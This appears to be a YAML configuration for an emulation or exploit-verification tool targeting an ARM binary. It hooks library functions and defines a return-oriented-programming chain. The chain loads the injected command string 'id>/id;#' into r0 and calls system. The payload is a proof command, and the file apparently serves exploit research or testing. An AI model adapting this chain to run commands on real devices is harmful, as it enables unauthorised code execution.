hooks:
  lib:
    func_hook:
    - {entry: '0xd040', leave: '0xd044', target: '0x1000', mode: 'skip'}  # fclose  
    - {entry: '0xd058', leave: '0xd05c', target: '0x1000', mode: 'skip'}  # flock
    - {entry: '0xd060', leave: '0xd064', target: '0x1000', mode: 'skip'}  # close
    - {entry: '0xd074', leave: '0xd078', target: '0x1000', mode: 'skip'}  # popen
    - {entry: '0xd0c0', leave: '0xd0c4', target: '0x1000', mode: 'skip'}  # snprintf
    - {entry: '0xd0c8', leave: '0xd0cc', target: '0x1000', mode: 'skip'}  # FUN_0000cb10
    - {entry: '0xd0d0', leave: '0xd0d4', target: '0x1000', mode: 'skip'}  # pclose
    - {entry: '0xd104', leave: '0xd108', target: '0x1000', mode: 'skip'}  # log
    - {entry: '0xd11c', leave: '0xd120', target: '0x1000', mode: 'skip'}  # snprintf
    - {entry: '0xd124', leave: '0xd128', target: '0x1000', mode: 'skip'}  # log
    - {entry: '0xd13c', leave: '0xd140', target: '0x1000', mode: 'skip'}  # snprintf
    - {entry: '0xd144', leave: '0xd148', target: '0x1000', mode: 'skip'}  # log
    - {entry: '0xc9bc', leave: '0xc9c0', target: '0x1000', mode: 'skip'}  # system
    - {entry: '0xc9c4', leave: '0xc9c8', target: '0x1000', mode: 'skip'}  # free
  libc:
    fgets:
    - {entry: '0xcfe0', leave: '0xcfe4', target: '0x1000', mode: 'model'}
    - {entry: '0xd094', leave: '0xd098', target: '0x1000', mode: 'model'}
    sscanf:
    - {entry: '0xcffc', leave: '0xd000', target: '0x1000', mode: 'model'}
    strcmp:
    - {entry: '0xd010', leave: '0xd014', target: '0x1000', mode: 'skip'}
    - {entry: '0xd0e8', leave: '0xd0ec', target: '0x1000', mode: 'skip'}
states:
  entry:
    regs:
    mems:
      '0x000120f8': ['0x25']  # '%'
      '0x000120f9': ['0x73']  # 's'
      '0x000120fa': ['0x20']  # ' '
      '0x000120fb': ['0x25']  # '%'
      '0x000120fc': ['0x73']  # 's'
      '0x000120fd': ['0x00']  #
ropchains:
  default:
    - preconditions:
        mems:
          '0xbeffc88c': '0xb8'  # pc = [sp+8*4] = 0x0000c9b8
          '0xbeffc88d': '0xc9'
          '0xbeffc88e': '0x00'
          '0xbeffc88f': '0x00'
      instruction:
        ['0x0000cf24', 'f0 8f bd e8', 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', 'Gadget 0.0']
    - preconditions:
      instruction:
        ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', 'Gadget 1.0']
    - preconditions:
        regs:
          'r0': '0xbeffc290'    # r0 = 0xbeffc104+396 = 0xbeffc290
        mems:
          '0xbeffc290': '0x69'  # 'i'
          '0xbeffc291': '0x64'  # 'd'
          '0xbeffc292': '0x3e'  # '>'
          '0xbeffc293': '0x2f'  # '/'
          '0xbeffc294': '0x69'  # 'i'
          '0xbeffc295': '0x64'  # 'd'
          '0xbeffc296': '0x3b'  # ';'
          '0xbeffc297': '0x23'  # '#'
          '0xbeffc298': '0x00'  #
      instruction:
        ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', 'Gadget 1.1']